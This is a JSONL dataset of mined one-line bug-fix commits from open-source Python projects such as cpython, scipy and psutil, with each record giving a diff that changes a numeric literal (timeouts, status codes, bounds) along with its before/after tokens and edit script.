{"project": "psutil", "commit_sha": "87156abc7782ea16c0236d94cf011bf371518dc0", "parent_sha": "e2d2f151c05e74b4709d3d278f7e906f4853919e", "file_path": "test/test_psutil.py", "project_url": "https://github.com/mindw/psutil", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -593,7 +593,7 @@ class TestSystemAPIs(unittest.TestCase):\n         if POSIX:\n             self.assertEqual(gone.pop().retcode, signal.SIGTERM)\n         else:\n-            self.assertEqual(gone.pop().retcode, 0)\n+            self.assertEqual(gone.pop().retcode, 1)\n         self.assertEqual(l, [sproc3.pid])\n         for p in alive:\n             self.assertFalse(hasattr(p, 'retcode'))\n", "before": "self . assertEqual ( gone . pop ( ) . retcode , 0 )", "after": "self . assertEqual ( gone . pop ( ) . retcode , 1 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0\", 3, 50, 3, 51], \"1\"]]"}
{"project": "cpython", "commit_sha": "b22f64a388e3c559da4862c9ba7dd2bb2fc14cf5", "parent_sha": "25c3f202e6514461123e09ee3a83c41265ab257b", "file_path": "Lib/test/test_zipfile64.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -46,7 +46,7 @@ class TestsWithSourceFile(unittest.TestCase):\n \n         # It will contain enough copies of self.data to reach about 6GB of\n         # raw data to store.\n-        filecount = 6*1024**2 // len(self.data)\n+        filecount = 6*1024**3 // len(self.data)\n \n         next_time = time.time() + _PRINT_WORKING_MSG_INTERVAL\n         for num in range(filecount):\n", "before": "filecount = 6 * 1024 ** 2 // len ( self . data )", "after": "filecount = 6 * 1024 ** 3 // len ( self . data )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 29, 3, 30], \"3\"]]"}
{"project": "cpython", "commit_sha": "6f42e8c00eb44c005dbae886beef58a34853b465", "parent_sha": "51f4e0627a8c02ce11d76b5de2135a5b8888e884", "file_path": "Lib/test/test_str.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ class StrTest(\n \n     def test_formatting(self):\n         string_tests.MixinStrUnicodeUserStringTest.test_formatting(self)\n-        self.assertRaises(OverflowError, '%c'.__mod__, 0x1234)\n+        self.assertRaises(OverflowError, '%c'.__mod__, 0x12341234)\n \n     def test_iterators(self):\n         # Make sure str objects have an __iter__ method\n", "before": "self . assertRaises ( OverflowError , '%c' . __mod__ , 0x1234 )", "after": "self . assertRaises ( OverflowError , '%c' . __mod__ , 0x12341234 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0x1234\", 3, 56, 3, 62], \"0x12341234\"]]"}
{"project": "cpython", "commit_sha": "3015916623d08237aac7f6f3b00d9f9b30f58a6d", "parent_sha": "eed776b5d6afe6e02f861ffe960cb8899c664087", "file_path": "Lib/test/test_smtplib.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ PORT = None\n \n def server(evt, buf):\n     serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n-    serv.settimeout(1)\n+    serv.settimeout(15)\n     serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n     serv.bind((\"\", 0))\n     global PORT\n", "before": "serv . settimeout ( 1 )", "after": "serv . settimeout ( 15 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 21, 3, 22], \"15\"]]"}
{"project": "cpython", "commit_sha": "c05122b62d48695e8e9ab0aab4319d54367ed499", "parent_sha": "5255f9270635112ee6028a682805f9b09106fa19", "file_path": "Lib/contextlib.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ def nested(*managers):\n     warn(\"With-statements now directly support multiple context managers\",\n-        DeprecationWarning, 2)\n+        DeprecationWarning, 3)\n     exits = []\n     vars = []\n     exc = (None, None, None)\n", "before": "warn ( \"With-statements now directly support multiple context managers\" , DeprecationWarning , 2 )", "after": "warn ( \"With-statements now directly support multiple context managers\" , DeprecationWarning , 3 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 1, 29, 1, 30], \"3\"]]"}
{"project": "cpython", "commit_sha": "44eff96f93293eac8fa7dfa8cda5b93b5c1f2c74", "parent_sha": "cef646d6f0ac7384fa8d23f23ebcce020fe8cb4a", "file_path": "Lib/test/test_os.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1042,7 +1042,7 @@ class Win32KillTests(unittest.TestCase):\n         # Let the interpreter startup before we send signals. See #3137.\n         count, max = 0, 20\n         while count < max and proc.poll() is None:\n-            if m[0] == 0:\n+            if m[0] == 1:\n                 break\n             time.sleep(0.5)\n             count += 1\n", "before": "if m [ 0 ] == 0 : break", "after": "if m [ 0 ] == 1 : break", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0\", 3, 24, 3, 25], \"1\"]]"}
{"project": "cpython", "commit_sha": "1c74d6732d3a3392d2f70f4bd3d1a76fd49075a8", "parent_sha": "e09ccd69fb7b789eac60105d7640800c0ee220f7", "file_path": "Lib/test/lock_tests.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -606,7 +606,7 @@ class BarrierTests(BaseTestCase):\n     N = 5\n \n     def setUp(self):\n-        self.barrier = self.barriertype(self.N, timeout=0.1)\n+        self.barrier = self.barriertype(self.N, timeout=0.5)\n     def tearDown(self):\n         self.barrier.abort()\n \n", "before": "self . barrier = self . barriertype ( self . N , timeout = 0.1 )", "after": "self . barrier = self . barriertype ( self . N , timeout = 0.5 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:0.1\", 3, 57, 3, 60], \"0.5\"]]"}
{"project": "cpython", "commit_sha": "141a681d2f4593283b00d4ff22bfe526d726a6dc", "parent_sha": "c3c73e8db0db1a7c83f8a8f8cf0ec45e5f32a203", "file_path": "Lib/test/test_unicode.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1410,7 +1410,7 @@ class UnicodeTest(string_tests.CommonTest,\n         # UTF-8 must be roundtrip safe for all code points\n         # (except surrogates, which are forbidden).\n         u = ''.join(map(chr, list(range(0, 0xd800)) +\n-                             list(range(0xe000, 0x10ffff))))\n+                             list(range(0xe000, 0x110000))))\n         for encoding in ('utf-8',):\n             self.assertEqual(str(u.encode(encoding),encoding), u)\n \n", "before": "u = '' . join ( map ( chr , list ( range ( 0 , 0xd800 ) ) + list ( range ( 0xe000 , 0x10ffff ) ) ) )", "after": "u = '' . join ( map ( chr , list ( range ( 0 , 0xd800 ) ) + list ( range ( 0xe000 , 0x110000 ) ) ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0x10ffff\", 3, 49, 3, 57], \"0x110000\"]]"}
{"project": "cpython", "commit_sha": "0025cf9f76fa3a2ecb90ec0de35586ea54d1f56f", "parent_sha": "90a3a1cef9943ccdcdf8f5bc63bc28f81eafb94a", "file_path": "Lib/test/test_ftplib.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -767,7 +767,7 @@ class TestTimeouts(TestCase):\n     def setUp(self):\n         self.evt = threading.Event()\n         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n-        self.sock.settimeout(3)\n+        self.sock.settimeout(10)\n         self.port = support.bind_port(self.sock)\n         threading.Thread(target=self.server, args=(self.evt,self.sock)).start()\n         # Wait for the server to be ready.\n", "before": "self . sock . settimeout ( 3 )", "after": "self . sock . settimeout ( 10 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:3\", 3, 30, 3, 31], \"10\"]]"}
{"project": "cpython", "commit_sha": "f7ad4d859b7a46e19b610cb218b3f01462fd6df3", "parent_sha": "4a95fa3256ff3e0e026142c7bfc1091359f638c0", "file_path": "Lib/multiprocessing/managers.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -162,7 +162,7 @@ class Server(object):\n         Listener, Client = listener_client[serializer]\n \n         # do authentication later\n-        self.listener = Listener(address=address, backlog=5)\n+        self.listener = Listener(address=address, backlog=16)\n         self.address = self.listener.address\n \n         self.id_to_obj = {'0': (None, ())}\n", "before": "self . listener = Listener ( address = address , backlog = 5 )", "after": "self . listener = Listener ( address = address , backlog = 16 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:5\", 3, 59, 3, 60], \"16\"]]"}
{"project": "cpython", "commit_sha": "1e90c5b03635e15152145a7026895a7b9a18ed8d", "parent_sha": "7f6c72a9bba11afaad0507ca7919e968aea12bca", "file_path": "Lib/test/test_multiprocessing.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1714,7 +1714,7 @@ class _TestPool(BaseTestCase):\n         self.assertTimingAlmostEqual(get.elapsed, TIMEOUT1)\n \n     def test_async_timeout(self):\n-        res = self.pool.apply_async(sqr, (6, TIMEOUT2 + 0.2))\n+        res = self.pool.apply_async(sqr, (6, TIMEOUT2 + 1.0))\n         get = TimingWrapper(res.get)\n         self.assertRaises(multiprocessing.TimeoutError, get, timeout=TIMEOUT2)\n         self.assertTimingAlmostEqual(get.elapsed, TIMEOUT2)\n", "before": "res = self . pool . apply_async ( sqr , ( 6 , TIMEOUT2 + 0.2 ) )", "after": "res = self . pool . apply_async ( sqr , ( 6 , TIMEOUT2 + 1.0 ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:0.2\", 3, 57, 3, 60], \"1.0\"]]"}
{"project": "cpython", "commit_sha": "70b5e2b4ce1ba537a0be3a4b90467d687234ea0c", "parent_sha": "cd6e0070afa50a6a4988d4c7cdb80065429ab97c", "file_path": "Lib/test/_test_multiprocessing.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3651,7 +3651,7 @@ class TestSemaphoreTracker(unittest.TestCase):\n         _multiprocessing.sem_unlink(name1)\n         p.terminate()\n         p.wait()\n-        time.sleep(1.0)\n+        time.sleep(2.0)\n         with self.assertRaises(OSError) as ctx:\n             _multiprocessing.sem_unlink(name2)\n         # docs say it should be ENOENT, but OSX seems to give EINVAL\n", "before": "time . sleep ( 1.0 )", "after": "time . sleep ( 2.0 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:1.0\", 3, 20, 3, 23], \"2.0\"]]"}
{"project": "coursebuilder-core", "commit_sha": "ad23f1978f570fbd19d6649e73f3a4fde58a6606", "parent_sha": "3fde72c540783075c964c3305c718fed08936d3c", "file_path": "coursebuilder/models/courses.py", "project_url": "https://github.com/imisi-akande/coursebuilder-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -620,7 +620,7 @@ class Unit13(object):\n         self.href = None\n \n         # Only valid for the unit.type == verify.UNIT_TYPE_ASSESSMENT.\n-        self.weight = 0\n+        self.weight = 1\n \n         # Only valid for the unit.type == verify.UNIT_TYPE_ASSESSMENT.\n         self.html_content = None\n", "before": "self . weight = 0", "after": "self . weight = 1", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0\", 3, 23, 3, 24], \"1\"]]"}
{"project": "coursebuilder-core", "commit_sha": "9f7e5d858f7cc11162de9bac708606db967082ec", "parent_sha": "672655a7f90cbb1073da3503812d4e402d699bff", "file_path": "coursebuilder/modules/data_pump/data_pump_tests.py", "project_url": "https://github.com/imisi-akande/coursebuilder-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -361,7 +361,7 @@ class PiiTests(actions.TestBase):\n         unix_epoch = datetime.datetime(year=1970, month=1, day=1)\n         expected_sec = (expected_end_date - unix_epoch).total_seconds()\n         actual_sec = (end_date - unix_epoch).total_seconds()\n-        self.assertLessEqual(expected_sec - actual_sec, 1.0)\n+        self.assertLessEqual(expected_sec - actual_sec, 2.0)\n \n     def test_pii_secret_expiration(self):\n         token = data_pump.DataPumpJob._build_new_pii_encryption_token('1s')\n", "before": "self . assertLessEqual ( expected_sec - actual_sec , 1.0 )", "after": "self . assertLessEqual ( expected_sec - actual_sec , 2.0 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:1.0\", 3, 57, 3, 60], \"2.0\"]]"}
{"project": "gltf2usd", "commit_sha": "a155617b86603df643f102ea510d2e3631c663d7", "parent_sha": "a6a766bae2b538bd6db2c553d4d96db494ca7990", "file_path": "Source/_gltf2usd/usd_material.py", "project_url": "https://github.com/kcoley/gltf2usd", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -231,7 +231,7 @@ class USDPreviewSurface():\n             self._diffuse_color.Set(tuple(base_color_scale[0:3]))\n         else:\n             destination = base_color_texture.write_to_directory(self._output_directory, GLTFImage.ImageColorChannels.RGBA)\n-            scale_factor = tuple(base_color_scale[0:3])\n+            scale_factor = tuple(base_color_scale[0:4])\n             usd_uv_texture = USDUVTexture(\"baseColorTexture\", self._stage, self._usd_material._usd_material, base_color_texture, [self._st0, self._st1])\n             usd_uv_texture._file_asset.Set(destination)\n             usd_uv_texture._scale.Set(scale_factor)\n", "before": "scale_factor = tuple ( base_color_scale [ 0 : 3 ] )", "after": "scale_factor = tuple ( base_color_scale [ 0 : 4 ] )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:3\", 3, 53, 3, 54], \"4\"]]"}
{"project": "kin-app-server", "commit_sha": "80d5995f43f3a82d461176b32762b16dc38b24b1", "parent_sha": "a9159697a650c41ceddf1419df94979018918856", "file_path": "kinappserver/tests/phone_verification.py", "project_url": "https://github.com/kinecosystem/kin-app-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -165,7 +165,7 @@ class Tester(unittest.TestCase):\n                             headers={USER_ID_HEADER: str(userid)},\n                             content_type='application/json')\n         print('post task results response: %s' % json.loads(resp.data))\n-        self.assertEqual(resp.status_code, 400)\n+        self.assertEqual(resp.status_code, 403)\n         self.assertEqual(data['reason'], 'user_deactivated')\n \n if __name__ == '__main__':\n", "before": "self . assertEqual ( resp . status_code , 400 )", "after": "self . assertEqual ( resp . status_code , 403 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:400\", 3, 44, 3, 47], \"403\"]]"}
{"project": "fabric8-analytics-common", "commit_sha": "2c5493a94dfb91cdc0ba47d3645b56e776bb2d65", "parent_sha": "fb30b41c9dbdc49b11d8252a960c0ccb3117e976", "file_path": "taas/taas.py", "project_url": "https://github.com/fabric8-analytics/fabric8-analytics-common", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ def run_test(testname):\n     if result == 0:\n         return {\"Status\": \"ok\"}, 200\n     else:\n-        return {\"Status\": \"error\"}, 200\n+        return {\"Status\": \"error\"}, 500\n \n \n def main():\n", "before": "return { \"Status\" : \"error\" } , 200", "after": "return { \"Status\" : \"error\" } , 500", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:200\", 3, 37, 3, 40], \"500\"]]"}
{"project": "zipline", "commit_sha": "9e0ad5de15e0849cdad4a7b12004d0e5855ae519", "parent_sha": "39507efed2d7ddedda3197a0ed3e3e8b565e3b66", "file_path": "zipline/pipeline/factors/factor.py", "project_url": "https://github.com/andportnoy/zipline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -790,7 +790,7 @@ class Factor(RestrictedDTypeMixin, ComputableTerm):\n         Returns\n         -------\n         deciles : zipline.pipeline.classifiers.Quantiles\n-            A Classifier producing integer labels ranging from 0 to 4.\n+            A Classifier producing integer labels ranging from 0 to 9.\n", "before": "4.", "after": "9.", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:4.\", 3, 69, 3, 71], \"9.\"]]"}
{"project": "populo", "commit_sha": "2629b48de8de6139731b61af4e39de88027adfd0", "parent_sha": "2c27c424f981206138c5319b9d34358c404b4c75", "file_path": "lms/djangoapps/courseware/tests/test_module_render.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -159,7 +159,7 @@ class ModuleRenderTestCase(ModuleStoreTestCase, LoginEnrollmentTestCase):\n             ]\n         )\n         response = self.client.post(dispatch_url, {'position': 2})\n-        self.assertEquals(403, response.status_code)\n+        self.assertEquals(401, response.status_code)\n \n \n @override_settings(MODULESTORE=TEST_DATA_MIXED_MODULESTORE)\n", "before": "self . assertEquals ( 403 , response . status_code )", "after": "self . assertEquals ( 401 , response . status_code )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:403\", 3, 27, 3, 30], \"401\"]]"}
{"project": "populo", "commit_sha": "fd7a99db0b172b31ae37bd00fb5b3c8983e210be", "parent_sha": "bd817bb41ef5a3a643920feed79059f19c207dac", "file_path": "lms/djangoapps/instructor_task/tests/test_tasks_helper.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1336,7 +1336,7 @@ class TestCertificateGeneration(InstructorTaskModuleTestCase):\n \n         current_task = Mock()\n         current_task.update_state = Mock()\n-        with self.assertNumQueries(104):\n+        with self.assertNumQueries(109):\n             with patch('instructor_task.tasks_helper._get_current_task') as mock_current_task:\n                 mock_current_task.return_value = current_task\n                 with patch('capa.xqueue_interface.XQueueInterface.send_to_queue') as mock_queue:\n", "before": "with self . assertNumQueries ( 104 ) : with patch ( 'instructor_task.tasks_helper._get_current_task' ) as mock_current_task : mock_current_task . return_value = current_task with patch ( 'capa.xqueue_interface.XQueueInterface.send_to_queue' ) as mock_queue : ", "after": "with self . assertNumQueries ( 109 ) : with patch ( 'instructor_task.tasks_helper._get_current_task' ) as mock_current_task : mock_current_task . return_value = current_task with patch ( 'capa.xqueue_interface.XQueueInterface.send_to_queue' ) as mock_queue : ", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:104\", 3, 36, 3, 39], \"109\"]]"}
{"project": "capstone", "commit_sha": "e52ab31cc3a4f788e2a0f0ab3ce9a76a306b72fa", "parent_sha": "8c27c58425199fc5c515f9b8fb927b9780f6b70a", "file_path": "capstone/scripts/ingest_tt_data.py", "project_url": "https://github.com/harvard-lil/capstone", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ def populate_jurisdiction():\n     reporters = Reporters.objects.values('state').distinct() \n     for jurisdiction in reporters:\n         # ensures no dupes if the command was already run. Small enough dataset to check every time\n-        if Jurisdiction.objects.filter(name=jurisdiction['state']).count() > 1:\n+        if Jurisdiction.objects.filter(name=jurisdiction['state']).count() > 0:\n             continue\n         new_jurisdiction = Jurisdiction()\n         new_jurisdiction.name = jurisdiction['state']\n", "before": "if Jurisdiction . objects . filter ( name = jurisdiction [ 'state' ] ) . count ( ) > 1 : continue", "after": "if Jurisdiction . objects . filter ( name = jurisdiction [ 'state' ] ) . count ( ) > 0 : continue", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 78, 3, 79], \"0\"]]"}
{"project": "impact-api", "commit_sha": "346f18bdfdeb14d75ea1adfdf57b10098ae09f82", "parent_sha": "21e087a6e15ba2d1031ab285d04c2817edf7d253", "file_path": "web/impact/impact/tests/test_organization_list_view.py", "project_url": "https://github.com/masschallenge/impact-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -125,7 +125,7 @@ class TestOrganizationListView(APITestCase):\n     def test_next_info_contains_filter(self):\n         name = \"foo\"\n         StartupFactory(organization__name=name)\n-        StartupFactory.create_batch(10)\n+        StartupFactory.create_batch(20)\n         with self.login(email=self.basic_user().email):\n             name_query_parameter = \"name=%s\" % name\n             url = self.url + \"?\" + name_query_parameter\n", "before": "StartupFactory . create_batch ( 10 )", "after": "StartupFactory . create_batch ( 20 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:10\", 3, 37, 3, 39], \"20\"]]"}
{"project": "capstone", "commit_sha": "da1115cfd489aebea94696a4234865d597d5ee57", "parent_sha": "4b57f81292870dc44d61c03928fef80680da500c", "file_path": "capstone/capapi/tests/test_api.py", "project_url": "https://github.com/harvard-lil/capstone", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -205,7 +205,7 @@ def test_authenticated_multiple_full_cases(auth_user, api_url, auth_client, thre\n \n     # fetch the two blacklisted cases and one whitelisted case\n     url = \"%scases/?full_case=true\" % (api_url)\n-    with django_assert_num_queries(select=7, update=1):\n+    with django_assert_num_queries(select=4, update=1):\n         response = auth_client.get(url)\n     check_response(response)\n \n", "before": "with django_assert_num_queries ( select = 7 , update = 1 ) : response = auth_client . get ( url )", "after": "with django_assert_num_queries ( select = 4 , update = 1 ) : response = auth_client . get ( url )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:7\", 3, 43, 3, 44], \"4\"]]"}
{"project": "Broadlink-RM2-Universal-IR-Remote-Controller-Domoticz-plugin", "commit_sha": "518391be100feba1df045510b58942cc1361c9a9", "parent_sha": "1b20e4030452ad7bee7d160dd7fe265fb2cf2d74", "file_path": "plugin.py", "project_url": "https://github.com/Whilser/Broadlink-RM2-Universal-IR-Remote-Controller-Domoticz-plugin", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -360,7 +360,7 @@ class BasePlugin:\n         global ir\n \n         ir = None\n-        devices = broadlink.discover(timeout=8)\n+        devices = broadlink.discover(timeout=10)\n         if str(len(devices)) == 0:\n             Domoticz.Error('No broadlink devices was found with Mac = {0}. Check Network/Mac address.'.format(Parameters['Mode1']))\n             return False\n", "before": "devices = broadlink . discover ( timeout = 8 )", "after": "devices = broadlink . discover ( timeout = 10 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:8\", 3, 46, 3, 47], \"10\"]]"}
{"project": "scipy", "commit_sha": "22fdefdb6f5dd65b0b0ed605647b579a1a345f1b", "parent_sha": "1b0e4cf03483b4f82794170513a5f9957c1b5d55", "file_path": "scipy/fftpack/tests/test_basic.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -365,7 +365,7 @@ class TestFftn(TestCase):\n         assert_array_almost_equal(y, fft(x, axis=-1, n=8))\n \n         x = numpy.random.random((10, 5, 3, 7))\n-        y = fftn(x, axes=(-2,), shape=(4,))\n+        y = fftn(x, axes=(-2,), shape=(8,))\n         assert_array_almost_equal(y, fft(x, axis=-2, n=8))\n \n     def test_shape_argument_more(self):\n", "before": "y = fftn ( x , axes = ( - 2 , ) , shape = ( 4 , ) )", "after": "y = fftn ( x , axes = ( - 2 , ) , shape = ( 8 , ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:4\", 3, 40, 3, 41], \"8\"]]"}
{"project": "scipy", "commit_sha": "5d4ddd4ef2e0517c79b286ac3e8bf9c3906e4601", "parent_sha": "705fa6aec3e6ca62c9eb0264e35dbf3507dbf607", "file_path": "scipy/cluster/hierarchy.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -974,7 +974,7 @@ def inconsistent(Z, d=2):\n            ``R[i,3]`` is the inconsistency coefficient,\n            .. math:\n                \\frac{\\mathtt{Z[i,2]}-\\mathtt{R[i,0]}}\n-                    {R[i,2]}.\n+                    {R[i,1]}.\n \n     This function behaves similarly to the MATLAB(TM) inconsistent\n     function.\n", "before": "{ R [ i , 2 ] } . This function behaves similarly to the MATLAB ( TM )", "after": "{ R [ i , 1 ] } . This function behaves similarly to the MATLAB ( TM )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 26, 3, 27], \"1\"]]"}
{"project": "mps-youtube", "commit_sha": "0fd59d387450b7a03d33ff21afb3cf2b8bd0101f", "parent_sha": "79c1532f9ec615c7b8d4daf6b5ffba7e5b44fcb4", "file_path": "mps_youtube/main.py", "project_url": "https://gitlab.com/alidz1982/mps-youtube", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1996,7 +1996,7 @@ def player_status(po_obj, prefix=\"\", songlength=0, mpv=False):\n def make_status_line(match_object, songlength=0):\n     \"\"\" Format progress line output.  \"\"\"\n     cw = getxy(\"width\")\n-    progress_bar_size = cw - 50\n+    progress_bar_size = cw - 54\n \n     try:\n         h, m, s = map(int, match_object.groups())\n", "before": "progress_bar_size = cw - 50", "after": "progress_bar_size = cw - 54", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:50\", 3, 30, 3, 32], \"54\"]]"}
{"project": "scipy", "commit_sha": "2b0ade82b92c314a6bd05edcbcd7c58e59fded0e", "parent_sha": "4f35dac00f886884b1bd848b6ac12aaa26a634fe", "file_path": "scipy/linalg/decomp.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -820,7 +820,7 @@ def hessenberg(a, calc_q=False, overwrite_a=False, check_finite=True):\n         raise ValueError('expected square matrix')\n     overwrite_a = overwrite_a or (_datacopied(a1, a))\n     gehrd,gebal = get_lapack_funcs(('gehrd','gebal'), (a1,))\n-    ba, lo, hi, pivscale, info = gebal(a1, permute=1, overwrite_a=overwrite_a)\n+    ba, lo, hi, pivscale, info = gebal(a1, permute=0, overwrite_a=overwrite_a)\n     if info < 0:\n         raise ValueError('illegal value in %d-th argument of internal gebal '\n                                                     '(hessenberg)' % -info)\n", "before": "ba , lo , hi , pivscale , info = gebal ( a1 , permute = 1 , overwrite_a = overwrite_a )", "after": "ba , lo , hi , pivscale , info = gebal ( a1 , permute = 0 , overwrite_a = overwrite_a )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 52, 3, 53], \"0\"]]"}
{"project": "modmail", "commit_sha": "6138285fe7ebc0d4273290e1e543f155d86a73bc", "parent_sha": "25d8528a5671a08ee99739e18c843d183e8baccf", "file_path": "cogs/utility.py", "project_url": "https://github.com/ZufaCenva/modmail", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -683,7 +683,7 @@ class Utility(commands.Cog):\n         await self.bot.wait_until_ready()\n         while not self.bot.is_closed():\n             self.presence = await self.set_presence()\n-            await asyncio.sleep(3600)\n+            await asyncio.sleep(600)\n \n     @commands.command()\n     @checks.has_permissions(PermissionLevel.ADMINISTRATOR)\n", "before": "await asyncio . sleep ( 3600 )", "after": "await asyncio . sleep ( 600 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:3600\", 3, 33, 3, 37], \"600\"]]"}
{"project": "scipy", "commit_sha": "72318be1d5495c179b3dc68d00b8088c83ddcc21", "parent_sha": "d412085028d8431ee30424424c11cfc69c47950b", "file_path": "scipy/stats/_continuous_distns.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -150,7 +150,7 @@ class kstwo_gen(rv_continuous):\n     def _get_support(self, n):\n-        return 1.0/n, 1.0\n+        return 0.5/n, 1.0\n \n     def _pdf(self, x, n):\n         return kolmognp(n, x)\n", "before": "return 1.0 / n , 1.0", "after": "return 0.5 / n , 1.0", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"float:1.0\", 1, 16, 1, 19], \"0.5\"]]"}
{"project": "scipy", "commit_sha": "06766fd4646cb436eabecc5cb73dd1fa0a17e0ed", "parent_sha": "649e90cc758559a85149525ed728ba420c639fda", "file_path": "scipy/sparse/linalg/eigen/lobpcg/tests/test_lobpcg.py", "project_url": "https://github.com/Kai-Striega/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -323,7 +323,7 @@ def test_diagonal_data_types():\n     \"\"\"Check lobpcg for diagonal matrices for all matrix types.\n     \"\"\"\n     np.random.seed(1234)\n-    n = 50\n+    n = 40\n     m = 4\n     # Define the generalized eigenvalue problem Av = cBv\n     # where (c, v) is a generalized eigenpair,\n", "before": "n = 50", "after": "n = 40", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:50\", 3, 9, 3, 11], \"40\"]]"}
